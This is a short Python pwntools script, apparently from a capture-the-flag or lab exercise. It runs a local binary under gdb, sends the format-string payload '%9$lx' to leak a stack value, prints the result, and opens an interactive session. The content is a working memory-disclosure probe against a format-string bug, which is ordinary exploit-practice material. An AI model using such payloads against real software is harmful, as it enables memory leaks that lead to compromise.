from pwn import *
 
e = ELF("./a.out")

io = e.process(level="error")
gdb.attach(io, '''b *(main+167)
continue''')
io.sendline(b"%9$lx")
io.recvline()
print(io.recvline().strip())
io.interactive()
io.close()
